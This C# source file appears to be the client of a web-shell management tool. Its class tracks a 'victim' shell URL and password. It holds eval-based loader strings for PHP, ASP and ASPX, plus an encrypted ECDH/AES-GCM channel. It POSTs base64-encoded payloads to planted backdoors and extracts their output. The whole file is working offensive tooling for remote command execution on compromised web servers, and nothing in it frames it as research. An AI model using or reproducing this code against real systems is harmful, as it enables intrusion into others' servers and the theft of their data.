using System;
using System.Collections.Generic;
using System.Data.Entity.Core.Mapping;
using System.Linq;
using System.Net.Cache;
using System.Reflection.Metadata;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Net;

namespace Alien
{
    public class clsWeb
    {
        public clsVictim m_victim { get; set; }
        public HttpClient m_clnt { get; set; }

        private bool m_bUseCrypto { get; init; }
        private AesGcm m_aesgcm { get; set; }
        private string m_szSessionToken { get; set; }
        private bool bTokenExisted { get; set; }
        private int m_nSequence { get; set; }

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "php" },
            { enLanguage.ASP, "asp" },
            { enLanguage.ASPX, "aspx" },
            { enLanguage.ASMX, "asmx" },
            { enLanguage.ASHX, "ashx" },
            { enLanguage.JSP, "jsp" },
            { enLanguage.JSPX, "jspx" },
            { enLanguage.CGI, "cgi" },
            { enLanguage.Python, "py" },
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string[]> m_dicRemoveSyntax = new Dictionary<enLanguage, string[]>()
        {
            {
                enLanguage.PHP,
                new string[]
                {
                    "<?php", "?>",
                }
            },
            {
                enLanguage.ASP,
                new string[]
                {
                    "<%", "%>",
                }
            }
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
            //{ enLanguage.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
            { enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+d(s):Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End+Function:Execute(d(""""[PATTERN]"""")):Response.End"")" },
            { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""UTF-8"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
        };

        /// <summary>
        /// 
        /// </summary>
        private Dictionary<enLanguage, string> m_dicSplitter = new Dictionary<enLanguage, string>()
        {
            { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
            { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
        };

        private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
        {
            { enLanguage.PHP, clsEzData.fnszStre2b64 },
            { enLanguage.ASP, szInput => Convert.ToHexString(Encoding.UTF8.GetBytes(szInput)) },
            { enLanguage.ASPX, clsEzData.fnszStre2b64 },
            { enLanguage.JSP, szInput => szInput } // nop
        };

        public clsWeb(clsVictim victim)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            m_victim = victim;
            var cookieContainer = new CookieContainer();
            var handler = new HttpClientHandler()
            {
                CookieContainer = cookieContainer,
                UseCookies = true,
                AllowAutoRedirect = true,
            };

            m_clnt = new HttpClient(handler)
            {
                BaseAddress = new Uri(m_victim.ShellURL),
            };

            m_bUseCrypto = m_victim.m_ShellConfig.payloadType == enPayloadType.Crypto;
        }

        private static readonly JsonSerializerOptions s_jsonOpts = new()
        {
            Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
        };

        public async Task<JsonElement> fnGetJson(string szUrl)
        {
            string res = await m_clnt.GetStringAsync(szUrl);
            return JsonDocument.Parse(res).RootElement;
        }

        public async Task<JsonElement> fnPostJson(string szUrl, object objJson)
        {
            string json = JsonSerializer.Serialize(objJson, s_jsonOpts);
            var res = await m_clnt.PostAsync(szUrl, new StringContent(json, Encoding.UTF8, "application/json"));

            string text = res.Content.ReadAsStringAsync().Result;

            return JsonDocument.Parse(text).RootElement;
        }

        private byte[] fnabHKDFExpand(byte[] abIKM, int nLength, string szInfo)
        {
            // PRK = HMAC-SHA256(salt=zeros, IKM)
            using var hmacExtract = new HMACSHA256(new byte[32]); // salt = 32 zero bytes
            byte[] abPRK = hmacExtract.ComputeHash(abIKM);

            // Expand
            using var hmac = new HMACSHA256(abPRK);
            byte[] t = Array.Empty<byte>();
            byte[] abOKM = new byte[nLength];
            int pos = 0;
            byte counter = 1;

            while (pos < nLength)
            {
                byte[] infoBytes = Encoding.UTF8.GetBytes(szInfo);
                byte[] abInput = new byte[t.Length + infoBytes.Length + 1];
                Buffer.BlockCopy(t, 0, abInput, 0, t.Length);
                Buffer.BlockCopy(infoBytes, 0, abInput, t.Length, infoBytes.Length);
                abInput[^1] = counter++;

                hmac.Key = abPRK; // reset key each round
                t = hmac.ComputeHash(abInput);

                int nCopyLen = Math.Min(t.Length, nLength - pos);
                Buffer.BlockCopy(t, 0, abOKM, pos, nCopyLen);
                pos += nCopyLen;
            }

            return abOKM;
        }

        private string fnszPemEncode(string label, byte[] data)
        {
            string b64 = Convert.ToBase64String(data);

            StringBuilder sb = new();

            sb.AppendLine($"-----BEGIN {label}-----");

            for (int i = 0; i < b64.Length; i += 64)
            {
                sb.AppendLine(b64.Substring(i, Math.Min(64, b64.Length - i)));
            }

            sb.Append($"-----END {label}-----");

            return sb.ToString().Replace("\r\n", "\n");
        }

        /// <summary>
        /// HTTP POST request.
        /// </summary>
        /// <param name="szPayloadData"></param>
        /// <param name="szSplitter"></param>
        /// <returns></returns>
        public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
        {
            StringContent content;
            HttpResponseMessage resp;
            string szRespContent = string.Empty;

            try
            {
                // Encryption is enabled
                if (m_bUseCrypto)
                {
                    // Handshake
                    if (!bTokenExisted)
                    {
                        var httpResp = await fnGetJson(m_victim.ShellURL);

                        string szSignPubPem = httpResp.GetProperty("signPubKey").GetString().Trim();
                        string szServerEcdhPem = httpResp.GetProperty("serverEcdhPub").GetString().Trim();
                        byte[] abSignature = Convert.FromBase64String(httpResp.GetProperty("signature").GetString());
                        string szHandshakeToken = httpResp.GetProperty("handshakeToken").GetString();

                        byte[] abServerEcdh = Encoding.UTF8.GetBytes(szServerEcdhPem);

                        using RSA signPub = RSA.Create();
                        signPub.ImportFromPem(szSignPubPem);

                        bool bVerified = signPub.VerifyData(
                            abServerEcdh,
                            abSignature,
                            HashAlgorithmName.SHA256,
                            RSASignaturePadding.Pkcs1
                        );

                        if (!bVerified)
                            throw new Exception("Server identity verification failed");

                        // client ECDH
                        using (ECDiffieHellman clntEcdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256))
                        {
                            byte[] abClntEcdhPub = clntEcdh.ExportSubjectPublicKeyInfo();
                            string szEcdhPubPem = fnszPemEncode("PUBLIC KEY", abClntEcdhPub).Replace("\r\n", "\n").Trim();

                            // client signing key
                            using ECDsa dsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
                            byte[] abClntSignPub = dsa.ExportSubjectPublicKeyInfo();
                            string szClntSignPubPem = fnszPemEncode("PUBLIC KEY", abClntSignPub).Replace("\r\n", "\n").Trim();

                            byte[] abClntSign = dsa.SignData(
                                Encoding.UTF8.GetBytes(szEcdhPubPem),
                                HashAlgorithmName.SHA256,
                                DSASignatureFormat.Rfc3279DerSequence
                            );

                            var handshakeResp = await fnPostJson(m_victim.ShellURL, new
                            {
                                handshakeToken = szHandshakeToken,
                                clientEcdhPub = szEcdhPubPem,
                                clientSignPub = szClntSignPubPem,
                                clientSig = Convert.ToBase64String(abClntSign)
                            });

                            if (handshakeResp.TryGetProperty("error", out var err))
                                throw new Exception($"Handshake failed: {err.GetString()}");

                            m_szSessionToken = handshakeResp.GetProperty("sessionToken").GetString();

                            // derive shared secret
                            using ECDiffieHellman servEcdh = ECDiffieHellman.Create();
                            servEcdh.ImportFromPem(szServerEcdhPem);

                            byte[] abSharedSecret = clntEcdh.DeriveRawSecretAgreement(servEcdh.PublicKey);
                            byte[] abAesKey = fnabHKDFExpand(abSharedSecret, 32, "secure-channel");

                            m_aesgcm = new AesGcm(abAesKey, 16);

                            bTokenExisted = true;
                        }
                    }

                    if (m_aesgcm == null)
                        throw new Exception("Crypto not initialized");

                    var obj = new
                    {
                        cmd = "eval",
                        seq = m_nSequence,
                        data = szPayloadData
                    };

                    //MessageBox.Show(szPayloadData);

                    byte[] plaintext = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj, s_jsonOpts));

                    byte[] nonce = RandomNumberGenerator.GetBytes(12);
                    byte[] ciphertext = new byte[plaintext.Length];
                    byte[] tag = new byte[16];

                    m_aesgcm.Encrypt(nonce, plaintext, ciphertext, tag);

                    byte[] combined = new byte[12 + 16 + ciphertext.Length];

                    Buffer.BlockCopy(nonce, 0, combined, 0, 12);
                    Buffer.BlockCopy(tag, 0, combined, 12, 16);
                    Buffer.BlockCopy(ciphertext, 0, combined, 28, ciphertext.Length);

                    string encryptedPayload = Convert.ToBase64String(combined);

                    var encryptedBody = JsonSerializer.Serialize(new
                    {
                        sessionToken = m_szSessionToken,
                        payload = encryptedPayload
                    }, s_jsonOpts);

                    content = new StringContent(
                        encryptedBody,
                        Encoding.UTF8,
                        "application/json"
                    );
                }
                else
                {
                    content = new StringContent(
                        szPayloadData,
                        Encoding.GetEncoding(m_victim.ShellEncoding),
                        "application/x-www-form-urlencoded"
                    );
                }

                resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
                szRespContent = await resp.Content.ReadAsStringAsync();

                //MessageBox.Show(szRespContent);

                if (!m_bUseCrypto)
                {
                    szSplitter = $"[{szSplitter}]";

                    if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
                    {
                        return szRespContent.Split(szSplitter)[1];
                    }
                    else
                    {
                        frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                        return string.Empty;
                    }
                }

                if (resp.IsSuccessStatusCode)
                {
                    try
                    {
                        // After getting szRespContent, parse the JSON envelope first
                        var respJson = JsonDocument.Parse(szRespContent).RootElement;

                        // Update session token for next request
                        m_szSessionToken = respJson.GetProperty("sessionToken").GetString();

                        // Then decrypt the payload
                        string? szResp = respJson.GetProperty("payload").GetString();
                        if (string.IsNullOrEmpty(szResp))
                            throw new Exception("HTTP response is empty.");

                        //MessageBox.Show(szResp);

                        byte[] enc = Convert.FromBase64String(szResp);

                        byte[] respNonce = enc[..12];
                        byte[] respTag = enc[12..28];
                        byte[] respCt = enc[28..];

                        byte[] decrypted = new byte[respCt.Length];
                        m_aesgcm.Decrypt(respNonce, respCt, respTag, decrypted);

                        string result = Encoding.UTF8.GetString(decrypted);
                        JsonDocument json = JsonDocument.Parse(result);
                        JsonElement root = json.RootElement;

                        string? val = root.GetProperty("eval").GetString();
                        if (string.IsNullOrEmpty(val))
                            throw new Exception("Value is null or empty.");

                        val = clsEzData.fnszB64d2str(val).Replace("\r\n", string.Empty).Trim('\r').Trim('\n');
                        szSplitter = $"[{szSplitter}]";
                        val = val.Split(szSplitter)[1];

                        m_nSequence++;

                        //MessageBox.Show(val);

                        return val;
                    }
                    catch (Exception ex)
                    {
                        frmMsgBox f = new frmMsgBox("Decryption error", ex.Message);
                        return string.Empty;
                    }
                }
                else
                {
                    frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                    return string.Empty;
                }
            }
            catch (Exception ex)
            {
                frmMsgBox f = new frmMsgBox("HTTP Error", ex.Message);
                return string.Empty;
            }
        }

        public async Task<byte[]> fnabHttpPOST(string szPayloadData, string szSplitter)
        {
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            byte[] abResp = await resp.Content.ReadAsByteArrayAsync();
            string szResp = Encoding.UTF8.GetString(abResp);

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szResp.Contains(szSplitter))
            {
                szResp = szResp.Split(szSplitter)[1];

                byte[] abSplitter = Encoding.UTF8.GetBytes(szSplitter);
                
                int nStartIdx = fnIndexOf(abResp, abSplitter, 0);
                if (nStartIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                nStartIdx += abSplitter.Length;

                int nEndIdx = fnIndexOf(abResp, abSplitter, nStartIdx);
                if (nEndIdx == -1)
                    throw new Exception("Cannot find spliter: " + szSplitter);

                long nLength = nEndIdx - nStartIdx;
                byte[] abBuffer = new byte[nLength];
                Array.Copy(abResp, nStartIdx, abResp, 0, nLength);

                return abBuffer;
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szResp);
                return new byte[] { };
            }
        }

        private int fnIndexOf(byte[] haystack, byte[] needle, int start)
        {
            for (int i = start; i <= haystack.Length - needle.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        /// <summary>
        /// Do HTTP web connection to check alive.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestWebConnection()
        {
            try
            {
                using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                {
                    resp.EnsureSuccessStatusCode();

                    using (HttpContent content = resp.Content)
                    {
                        string szResult = await content.ReadAsStringAsync();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestWebConnection()");
                return false;
            }
        }

        /// <summary>
        /// Execute test payload.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestShellConnection()
        {
            try
            {
                string szPattern = clsEzData.fnszGenerateRandomStr();
                string szResp = await fnszSendPayload("test", new string[] { szPattern });

                return string.Equals(szResp, szPattern);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestShellConnection()");
                return false;
            }
        }

        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            if (m_bUseCrypto)
            {
                for (int i = 0; i < asParams.Length; i++)
                {
                    //szPayload = szPayload.Replace($"z{i}", clsEzData.fnszStre2b64(asParams[i]));
                    switch (m_victim.ShellLanguage)
                    {
                        case enLanguage.PHP:
                            szPayload = szPayload.Replace($"$_POST['z{i}']", $"\"{clsEzData.fnszStre2b64(asParams[i])}\"");
                            break;
                    }
                }
            }
            else
            {
                for (int i = 0; i < asParams.Length; i++)
                    asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";

                string szParams = string.Join("&", asParams);
                szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)))}&{szParams}";
            }

            return await fnHttpPOST(szPayload, szSplitter);
        }

        public async Task<byte[]> fnabSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            for (int i = 0; i < asParams.Length; i++)
                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

            string szMain = m_dicEncapusulator[m_victim.ShellLanguage](szPayload);
            string szLoader = m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", szMain);
            string szParams = string.Join("&", asParams);

            szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";

            return await fnabHttpPOST(szPayload, szSplitter);
        }

        /// <summary>
        /// Read payload from file with specified language, method and payload type.
        /// </summary>
        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
        /// <returns>Payload content</returns>
        private string fnGetPayload(string szPayloadName, string szSplitter)
        {
            string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
            string szPayloadFilePath = Path.Combine(new string[]
            {
                "Payload",
                m_victim.ShellLanguage.ToString(),
                m_victim.ShellMethod,
                m_victim.ShellPayloadType.ToString(),
                $"{szPayloadName}.{szSuffix}",
            });

            if (File.Exists(szPayloadFilePath))
            {
                string szPayload = File.ReadAllText(szPayloadFilePath);
                foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
                    szPayload = szPayload.Replace(szPattern, string.Empty);

                const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
                szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();

                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";

                return szPayload;
            }
            else
            {
                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }
    }
}